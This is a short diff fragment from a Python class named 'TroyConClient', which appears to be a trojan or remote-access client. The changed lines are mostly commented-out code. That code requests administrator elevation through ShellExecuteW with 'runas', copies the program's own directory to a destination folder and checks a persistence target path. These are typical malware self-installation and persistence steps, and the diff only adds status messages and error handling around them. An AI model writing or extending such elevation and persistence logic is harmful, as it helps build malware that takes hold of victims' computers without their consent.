@@ -146,11 +146,21 @@ class TroyConClient:
                 #         is_admin = False
 
                 #     if not is_admin:
+                #         print("[*] Administrator privileges required. Requesting elevation...")
+
                 #         params = " ".join([f'"{arg}"' for arg in sys.argv])
                 #         ctypes.windll.shell32.ShellExecuteW(
-                #             None, "runas", sys.executable, params, None, 1)
+                #             None, "runas", sys.executable, params, None, 1
+                #         )
                 #         sys.exit()
-                #     shutil.copytree(current_exe_dir, dest_dir)
+
+                #     try:
+                #         shutil.copytree(current_exe_dir, dest_dir)
+                #         print(f"[+] Successfully copied to: {dest_dir}")
+                #     except Exception as e:
+                #         print(f"[Error] Failed to copy directory: {e}")
+                # else:
+                #     print("[*] dest_dir already exists. No admin elevation needed.")
 
                 if not os.path.exists(persistence_target_path):
                     # if current_exe_path != persistence_target_path:
